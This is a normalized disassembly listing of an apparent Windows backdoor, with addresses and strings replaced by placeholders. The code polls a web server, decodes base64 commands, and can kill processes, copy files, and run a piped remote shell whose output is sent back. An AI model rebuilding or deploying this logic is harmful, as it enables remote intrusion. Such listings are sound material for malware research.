sub_401000
push ebp
mov ebp esp
mov eax 0x2940
call sub_4025c0
push ebx
push esi
push edi
push 0x1f
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x13f ]
mov [ ebp - 0x140 ] bl
push 0xf
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x7f ]
mov [ ebp - 0x80 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0xf
xor eax eax
pop ecx
lea edi [ ebp - 0x3f ]
mov [ ebp - 0x40 ] bl
push 0x6
[ edi ]
stosw [ edi ]
mov esi rw-data
push ebx
push esi
stosb [ edi ]
call memset
push rw-data
push esi
call strcpy
push ebx
call [ time@IAT ]
push eax
call [ srand@IAT ]
add esp 0x1c
lea eax [ ebp - 0x80 ]
push 0x6
push eax
push edi
call [ strncpy@IAT ]
mov edi rw-data
mov [ rw-data ] bl
push edi
push esi
call strcmp
add esp 0x14
test eax eax
je r-xdata
push rw-data
jmp r-xdata
call sub_40256c
jmp r-xdata
push 0x6
push ebx
push esi
call memset
push edi
push esi
call strcpy
add esp 0x14
xor eax eax
call sub_401da7
pop ecx
push 0x80
lea eax [ ebp - 0x140 ]
push ebx
push eax
call memset
push 0x40
lea eax [ ebp - 0x80 ]
push ebx
push eax
call memset
push 0x40
lea eax [ ebp - 0x40 ]
push ebx
push eax
call memset
push 0x6
mov edi rw-data
push ebx
push edi
call memset
lea eax [ ebp - 0x140 ]
push eax
push rw-data
push rw-data
call sub_401c5a
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x140 ]
push eax
call sub_402181
add esp 0x44
lea eax [ ebp - 0x80 ]
push eax
call strlen
cmp eax 0x7
pop ecx
jae r-xdata
movsx eax [ ebp - 0x7a ]
cmp eax 0x63
jg r-xdata
mov cl [ ebp + eax - 0x78 ]
mov [ ebp + eax - 0x40 ] cl
inc eax
cmp eax 0x40
jb r-xdata
sub eax 0x64
je r-xdata
je r-xdata
cmp [ ebp + eax - 0x80 ] bl
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_40220a
test eax eax
pop ecx
je r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x40 ]
push rw-data
push eax
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp eax 0x4b
jg r-xdata
push rw-data
jmp r-xdata
push rw-data
lea eax [ ebp - 0x40 ]
push rw-data
push eax
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
sub eax 0x3
je r-xdata
push rw-data
cmp eax 0x50
je r-xdata
je r-xdata
push rw-data
call sub_401da7
pop ecx
call sub_402426
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x10
jmp r-xdata
lea eax [ ebp - 0x40 ]
push rw-data
push eax
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x40 ]
push rw-data
push eax
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp eax 0x53
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_40142c
test eax eax
pop ecx
je r-xdata
sub eax 0x43
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
sub eax 0x5
je r-xdata
mov ecx 0x9ff
lea edi [ ebp - 0x293f ]
mov [ ebp - 0x2940 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x2940 ]
push eax
call sub_40135e
test eax eax
pop ecx
je r-xdata
push 0xf
xor eax eax
pop ecx
lea edi [ ebp - 0xbf ]
mov [ ebp - 0xc0 ] bl
push rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0xc0 ]
push eax
call strcpy
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0xc0 ]
push eax
call strcat
lea eax [ ebp - 0xc0 ]
push eax
call sub_401da7
lea eax [ ebp - 0x40 ]
push eax
call [ atoi@IAT ]
imul eax eax 0xea60
add esp 0x18
push eax
call [ Sleep@IAT ]
jmp r-xdata
cmp eax 0x58
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
dec eax
je r-xdata
sub eax 0x3
je r-xdata
push rw-data
jmp r-xdata
lea eax [ ebp - 0x2940 ]
push eax
jmp r-xdata
je r-xdata
dec eax
je r-xdata
sub eax 0x5
lea eax [ ebp - 0x40 ]
push rw-data
push eax
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
sub eax 0x3
je r-xdata
push rw-data
jmp r-xdata
jmp r-xdata
call sub_4014ae
push rw-data
jmp r-xdata
sub_40135e
push ebp
mov ebp esp
sub esp 0x400
and [ ebp - 0x400 ] 0x0
push ebx
push edi
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0x3ff ]
[ edi ]
stosw [ edi ]
push 0x0
push 0x2
stosb [ edi ]
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov edi 0x128
push esi
push edi
call ??2@YAPAXI@Z
mov esi eax
mov [ esp ] rw-data
mov [ esi ] edi
mov edi [ ebp + 0x8 ]
push edi
call strcpy
pop ecx
pop ecx
xor eax eax
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
push 0x1
pop eax
pop esi
push 0x400
lea eax [ ebp - 0x400 ]
push 0x0
push eax
call memset
lea eax [ ebp - 0x400 ]
push 0xa
push eax
push [ esi + 0x8 ]
call [ _ultoa@IAT ]
lea eax [ ebp - 0x400 ]
push eax
push edi
call strcat
push rw-data
push edi
call strcat
lea eax [ esi + 0x24 ]
push eax
push edi
call strcat
push rw-data
push edi
call strcat
add esp 0x38
jmp r-xdata
pop edi
pop ebx
leave
retn
push esi
push ebx
call Process32Next
test eax eax
je r-xdata
sub_40142c
push ebp
mov ebp esp
sub esp 0x128
push esi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
lea eax [ ebp - 0x128 ]
push eax
push esi
mov [ ebp - 0x128 ] 0x128
call Process32First
test eax eax
je r-xdata
xor eax eax
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32Next
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
push eax
push [ ebp + 0x8 ]
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
push [ ebp - 0x120 ]
push eax
push 0x1
call [ OpenProcess@IAT ]
mov esi eax
push 0x0
push esi
call [ TerminateProcess@IAT ]
push esi
call [ CloseHandle@IAT ]
push 0x1
pop eax
jmp r-xdata
pop esi
leave
retn
sub_4014ae
push ebp
mov ebp esp
sub esp 0x354
push ebx
push esi
mov esi [ CreateThread@IAT ]
push edi
xor ebx ebx
push rw-data
push ebx
push ebx
push sub_401b7e
push ebx
push ebx
mov [ rw-data ] bl
mov [ rw-data ] bl
mov [ rw-data ] ebx
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
push rw-data
push ebx
push ebx
push sub_4019de
push ebx
push ebx
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push 0xfa
call [ Sleep@IAT ]
cmp [ rw-data ] bl
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
pop edi
push edi
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x54 ]
push eax
call [ GetStartupInfoA@IAT ]
mov eax [ rw-data ]
push 0x3f
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
pop ecx
xor eax eax
lea edi [ ebp - 0x153 ]
mov [ ebp - 0x154 ] bl
push 0x7f
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x353 ]
mov [ ebp - 0x354 ] bl
[ edi ]
stosw [ edi ]
push rw-data
mov [ ebp - 0x28 ] 0x101
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] bx
stosb [ edi ]
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ rw-data ] bl
je r-xdata
lea eax [ ebp - 0x354 ]
push eax
push 0x200
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x354 ]
push eax
call strlen
cmp [ ebp + eax - 0x355 ] 0x5c
pop ecx
je r-xdata
lea eax [ ebp - 0x154 ]
push 0x100
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x154 ]
push eax
call strlen
cmp [ ebp + eax - 0x155 ] 0x5c
pop ecx
mov esi rw-data
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x354 ]
push eax
call strcat
pop ecx
pop ecx
lea eax [ ebp - 0x354 ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x154 ]
push eax
call strcat
pop ecx
lea eax [ ebp - 0x354 ]
pop ecx
push eax
push 0x200
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x354 ]
push eax
call strlen
cmp [ ebp + eax - 0x355 ] 0x5c
pop ecx
je r-xdata
lea eax [ ebp - 0x154 ]
push esi
push eax
call strcat
pop ecx
pop ecx
cmp [ ebp - 0x10 ] ebx
je r-xdata
lea eax [ ebp - 0x354 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x354 ]
pop ecx
push 0x1
push eax
lea eax [ ebp - 0x154 ]
push eax
call [ CopyFileA@IAT ]
jmp r-xdata
lea eax [ ebp - 0x354 ]
push esi
push eax
call strcat
pop ecx
pop ecx
push [ rw-data ]
mov esi [ CloseHandle@IAT ]
call esi
mov eax [ rw-data ]
mov edi [ TerminateThread@IAT ]
cmp eax ebx
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
cmp [ rw-data ] ebx
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
push ebx
mov edi rw-data
push rw-data
push edi
mov esi eax
call sub_40179e
add esp 0xc
push edi
push esi
call [ GetProcAddress@IAT ]
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x54 ]
push ecx
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
lea ecx [ ebp - 0x354 ]
push ebx
push ecx
call eax
test eax eax
je r-xdata
push [ rw-data ]
call esi
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push ebx
push eax
call edi
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
push [ rw-data ]
call esi
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push ebx
push eax
call edi
push ebx
push [ ebp - 0x10 ]
call [ TerminateProcess@IAT ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push eax
call esi
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push eax
call esi
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push eax
call esi
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push eax
call esi
push eax
call esi
sub_40179e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test eax eax
push edi
jne r-xdata
and [ ebp + 0xc ] 0x0
and [ ebp - 0xc ] 0x0
mov ebx [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
test ecx ecx
mov [ ebp - 0x8 ] esi
jle r-xdata
push esi
call strlen
pop ecx
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0xc ] eax
jge r-xdata
lea eax [ ecx + 0x3 ]
shr eax 0x2
mov [ ebp - 0x10 ] eax
lea ecx [ eax + eax * 2 ]
shl eax 0x2
mov [ ebp + 0xc ] ecx
mov [ ebp - 0xc ] eax
and [ ebx ] 0x0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
leave
retn
sub eax [ ebp - 0xc ]
xor esi esi
mov [ ebp + 0x10 ] esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
mov [ ebp + 0x8 ] edi
shr [ ebp + 0x8 ] 0x8
push [ ebp + 0x8 ]
call sub_401992
mov esi eax
push edi
and esi 0xff0
shl esi 0x2
sar esi 0x6
call sub_401992
mov [ ebp - 0x4 ] edi
and eax 0x3f
shr [ ebp - 0x4 ] 0x10
push [ ebp - 0x4 ]
shl eax 0x2
or esi eax
call sub_401992
push [ ebp + 0x8 ]
and eax 0x3fc
shl eax 0x2
sar eax 0x4
mov [ ebp - 0x14 ] eax
call sub_401992
mov ecx [ ebp - 0x14 ]
and eax 0xf
shl eax 0x4
shr edi 0x18
or ecx eax
push edi
mov [ ebp + 0x8 ] ecx
call sub_401992
push [ ebp - 0x4 ]
mov edi eax
and edi 0xff
shl edi 0x2
sar edi 0x2
call sub_401992
and eax 0x3
add [ ebp - 0x8 ] 0x4
shl eax 0x6
or edi eax
add esp 0x18
shl edi 0x8
or edi [ ebp + 0x8 ]
shl edi 0x8
or edi esi
mov [ ebx ] edi
add ebx 0x3
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] esi
shr [ ebp + 0x10 ] 0x8
push [ ebp + 0x10 ]
call sub_401992
mov edx eax
push esi
shl edx 0x2
sar edx 0x6
mov [ ebp + 0x8 ] edx
call sub_401992
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
shl al 0x2
or cl al
mov eax esi
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
and eax 0xff00
cmp eax 0x3d00
je r-xdata
mov esi [ ebp - 0x8 ]
mov ecx eax
lea edi [ ebp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp + 0x10 ]
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff000000
cmp eax 0x3d000000
je r-xdata
mov eax esi
shr eax 0x10
push eax
call sub_401992
push [ ebp + 0x10 ]
mov edx eax
shl edx 0x2
sar edx 0x4
mov [ ebp + 0x10 ] edx
call sub_401992
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x4
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
mov eax esi
shr eax 0x18
push eax
call sub_401992
mov edx eax
shl edx 0x2
shr esi 0x10
sar edx 0x2
push esi
mov [ ebp + 0x10 ] edx
call sub_401992
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x6
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
sub_401992
mov cl [ esp + 0x4 ]
or eax 0xffffffff
cmp cl 0x41
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x5a
jg r-xdata
cmp cl 0x30
jl r-xdata
cmp cl 0x7a
jg r-xdata
movsx eax cl
sub eax 0x1d
retn
cmp cl 0x2b
jne r-xdata
cmp cl 0x39
jg r-xdata
movsx eax cl
sub eax 0x57
retn
cmp cl 0x2f
jne r-xdata
push 0x3e
pop eax
retn
movsx eax cl
sub eax 0x30
retn
retn
push 0x3f
pop eax
sub_4019de
push ebp
mov ebp esp
sub esp 0x110
and [ ebp - 0x90 ] 0x0
push edi
push 0x1f
xor eax eax
pop ecx
lea edi [ ebp - 0x8f ]
[ edi ]
stosw [ edi ]
push 0x200
stosb [ edi ]
call ??2@YAPAXI@Z
pop ecx
xor edi edi
push 0x1
mov [ ebp - 0xc ] 0xc
pop eax
mov [ ebp - 0x8 ] edi
mov [ rw-data ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push edi
push eax
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
pop edi
leave
retn 0x4
push ebx
push esi
mov [ rw-data ] 0x1
mov ebx rw-data
call sub_40256c
mov esi 0x80
push esi
push edi
push ebx
call memset
push esi
lea eax [ ebp - 0x110 ]
push edi
push eax
call memset
push esi
lea eax [ ebp - 0x90 ]
push edi
push eax
call memset
push 0x6
mov esi rw-data
push edi
push esi
call memset
push ebx
push rw-data
push rw-data
call sub_401c5a
lea eax [ ebp - 0x110 ]
push eax
push ebx
call sub_402181
add esp 0x44
lea eax [ ebp - 0x110 ]
push 0x6
push eax
push esi
call [ strncpy@IAT ]
and [ rw-data ] 0x0
push rw-data
push rw-data
call strcmp
add esp 0x14
test eax eax
je r-xdata
push 0x6
mov esi rw-data
push edi
push esi
call memset
push rw-data
push esi
call strcpy
lea eax [ ebp - 0x110 ]
push eax
call strlen
push 0x1e
lea esi [ ebp - 0x10a ]
pop ecx
lea edi [ ebp - 0x90 ]
[ edi ] [ esi ]
push 0x4
lea eax [ ebp - 0x90 ]
push rw-data
push eax
movsw [ edi ] [ esi ]
call [ _strnicmp@IAT ]
add esp 0x24
test eax eax
je r-xdata
and [ rw-data ] 0x0
push 0x1
pop eax
pop esi
pop ebx
lea eax [ ebp - 0x90 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x90 ]
push eax
call strlen
add esp 0xc
lea ecx [ ebp - 0x10 ]
push 0x0
push ecx
push eax
lea eax [ ebp - 0x90 ]
push eax
push [ rw-data ]
call [ WriteFile@IAT ]
xor edi edi
jmp r-xdata
sub_401b7e
push ebp
mov ebp esp
mov eax 0x19414
call sub_4025c0
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0x63ff
xor eax eax
lea edi [ ebp - 0x19413 ]
mov [ ebp - 0x19414 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x14 ]
push ebx
push eax
push rw-data
push rw-data
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x14 ] 0xc
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x1
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
mov esi 0x19000
pop edi
pop esi
pop ebx
leave
retn 0x4
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
push esi
lea eax [ ebp - 0x19414 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x19414 ]
push esi
push eax
push [ rw-data ]
call [ ReadFile@IAT ]
lea eax [ ebp - 0x19414 ]
push eax
call sub_401da7
pop ecx
push 0x400
lea eax [ ebp - 0x414 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push ebx
push ebx
push [ rw-data ]
call [ PeekNamedPipe@IAT ]
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
sub_401c5a
sub esp 0x44
push ebx
push esi
push edi
mov esi rw-data
push 0xa
push esi
call sub_40253b
and [ esp + 0x18 ] 0x0
push 0xf
pop ecx
xor eax eax
lea edi [ esp + 0x19 ]
push rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x1c ]
push eax
call strcpy
lea eax [ esp + 0x20 ]
push esi
push eax
call strcat
mov esi rw-data
push rw-data
push esi
call strcpy
add esp 0x20
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push esi
call [ InternetOpenA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
push ebp
push ebx
push __dos_header
mov eax rw-data
push 0x3
push eax
push eax
push ebx
push rw-data
push edi
call [ InternetConnectA@IAT ]
mov esi [ InternetCloseHandle@IAT ]
mov ebp eax
cmp ebp ebx
jne r-xdata
push rw-data
call [ printf@IAT ]
pop ecx
xor eax eax
jmp r-xdata
push ebx
push 0x4400000
push ebx
push ebx
lea eax [ esp + 0x24 ]
push rw-data
push eax
push rw-data
push ebp
call [ HttpOpenRequestA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push edi
call esi
push rw-data
call [ printf@IAT ]
pop ecx
pop edi
pop esi
pop ebx
add esp 0x44
retn
xor eax eax
push eax
push eax
push eax
push eax
push ebx
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push ebp
call esi
push edi
call esi
push rw-data
call [ printf@IAT ]
pop ecx
lea eax [ esp + 0x10 ]
push eax
push 0x80
push [ esp + 0x68 ]
push ebx
call [ InternetReadFile@IAT ]
push ebx
mov [ esp + 0x64 ] eax
call esi
push ebp
call esi
push edi
call esi
cmp [ esp + 0x60 ] 0x0
pop ebp
jne r-xdata
push ebx
call esi
push ebp
call esi
push edi
call esi
push rw-data
call [ printf@IAT ]
pop ecx
push 0x1
pop eax
push rw-data
call [ printf@IAT ]
pop ecx
sub_401da7
push ebp
mov ebp esp
mov eax 0x1908c
call sub_4025c0
push ebx
push esi
push edi
push 0x10
pop ecx
mov esi rw-data
lea edi [ ebp - 0x8c ]
push 0xa
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
push esi
call sub_40253b
push 0xf
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x47 ]
mov [ ebp - 0x48 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x48 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x48 ]
push esi
push eax
call strcat
mov esi rw-data
push rw-data
push esi
call strcpy
add esp 0x20
push ebx
push ebx
push ebx
push ebx
push esi
call [ InternetOpenA@IAT ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
push ebx
push ebx
mov edi rw-data
push 0x3
push edi
push rw-data
push 0x50
push rw-data
push eax
call [ InternetConnectA@IAT ]
mov esi [ InternetCloseHandle@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push rw-data
call [ printf@IAT ]
pop ecx
xor eax eax
jmp r-xdata
push ebx
push 0x80000000
push ebx
push ebx
lea eax [ ebp - 0x48 ]
push edi
push eax
push rw-data
push [ ebp - 0x4 ]
call [ HttpOpenRequestA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
push [ ebp - 0x8 ]
call esi
push rw-data
call [ printf@IAT ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8c ]
push 0xa0000000
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x8c ]
push eax
push edi
call [ HttpAddRequestHeadersA@IAT ]
cmp eax 0x1
jne r-xdata
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x8 ]
call esi
push rw-data
call [ printf@IAT ]
pop ecx
push edi
call esi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x8 ]
call esi
push 0x1
pop eax
push 0x19000
lea eax [ ebp - 0x1908c ]
push ebx
push eax
call memset
push [ ebp + 0x8 ]
call strlen
push eax
lea eax [ ebp - 0x1908c ]
push [ ebp + 0x8 ]
push eax
call sub_401f2e
lea eax [ ebp - 0x1908c ]
push eax
call strlen
add esp 0x20
push eax
lea eax [ ebp - 0x1908c ]
push eax
push ebx
push ebx
push edi
call [ HttpSendRequestA@IAT ]
sub_401f2e
push ebp
mov ebp esp
sub esp 0x124
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test ecx ecx
push edi
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
and [ ebp + 0x8 ] 0x0
mov [ ebp + 0xc ] eax
lea eax [ ecx - 0x3 ]
mov [ ebp - 0x8 ] esi
test eax eax
mov ebx rw-data
jle r-xdata
push esi
call strlen
pop ecx
mov [ ebp + 0x10 ] eax
mov ecx eax
cmp [ ebp + 0x8 ] ecx
jge r-xdata
push 0x3
add eax 0x2
xor edx edx
pop ecx
div ecx
mov ecx eax
mov [ ebp - 0xc ] eax
shl ecx 0x2
lea eax [ eax + eax * 2 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
and [ eax ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn
sub ecx [ ebp + 0x8 ]
xor edx edx
mov [ ebp + 0x10 ] edx
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
mov esi [ ebp - 0x8 ]
mov eax ecx
lea edi [ ebp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp + 0x10 ]
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x124 ]
jmp r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x9c ]
jmp r-xdata
movsx eax al
mov [ ebp - 0x10 ] eax
mov eax edx
mov ecx edx
push 0x10
shr eax 0xc
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
pop ecx
mov esi ebx
lea edi [ ebp - 0x9c ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov cl 0x3d
cmp edx 0x40
jge r-xdata
mov al [ ebp + eax - 0xe0 ]
jmp r-xdata
movsx eax al
mov [ ebp - 0x14 ] eax
mov eax edx
shr eax 0x8
mov ecx edx
and eax 0xf
shr ecx 0x16
shl eax 0x2
and ecx 0x3
push 0x10
or eax ecx
pop ecx
mov esi ebx
lea edi [ ebp - 0xe0 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
mov eax edx
mov ecx edx
shr eax 0x8
and eax 0xf
push 0x10
shr ecx 0x16
shl eax 0x2
and ecx 0x3
mov esi ebx
or eax ecx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x10
mov esi ebx
lea edi [ ebp - 0x58 ]
mov [ ecx ] al
mov eax edx
mov ecx edx
shr eax 0xc
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
pop ecx
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
push 0x10
pop ecx
mov esi ebx
lea edi [ ebp - 0x124 ]
mov edx [ eax ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ebp + edx - 0x58 ]
jmp r-xdata
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsx eax al
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
cmp eax 0x40
jge r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x1
mov [ ecx + 0x1 ] al
jle r-xdata
movsx ecx cl
shl ecx 0x8
or ecx eax
mov eax [ ebp + 0xc ]
shl ecx 0x8
or ecx [ ebp - 0x14 ]
add [ ebp + 0xc ] 0x4
add [ ebp - 0x8 ] 0x3
shl ecx 0x8
or ecx [ ebp - 0x10 ]
dec [ ebp - 0xc ]
mov [ eax ] ecx
jne r-xdata
cmp edx 0x40
jge r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov al [ ebp + edx - 0x58 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x2
mov [ ecx + 0x2 ] al
jle r-xdata
mov ecx [ ebp + 0xc ]
add [ ebp + 0xc ] 0x4
add [ ebp - 0x4 ] 0x4
mov [ ecx + 0x3 ] al
sub_402181
push ebp
mov ebp esp
sub esp 0x80
mov ax [ rw-data ]
push esi
push edi
push 0x1f
mov [ ebp - 0x80 ] ax
pop ecx
xor eax eax
lea edi [ ebp - 0x7e ]
mov esi [ strstr@IAT ]
push rw-data
push [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
call esi
push rw-data
mov edi eax
push [ ebp + 0x8 ]
call esi
add esp 0x10
test edi edi
je r-xdata
xor eax eax
test eax eax
je r-xdata
sub eax edi
add edi 0x4
sub eax 0x4
push eax
lea eax [ ebp - 0x80 ]
push edi
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x80 ]
push eax
call strlen
lea eax [ ebp - 0x80 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x80 ]
push eax
push [ ebp + 0xc ]
call sub_40179e
add esp 0x20
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
leave
retn
sub_40220a
push ebp
mov ebp esp
sub esp 0x2c0
push ebx
push esi
push edi
push 0xf
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x5f ]
mov [ ebp - 0x60 ] bl
push 0xf
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x9f ]
mov [ ebp - 0xa0 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x7f
xor eax eax
pop ecx
lea edi [ ebp - 0x2bf ]
mov [ ebp - 0x2c0 ] bl
mov [ ebp - 0x4 ] ebx
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x2c0 ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push rw-data
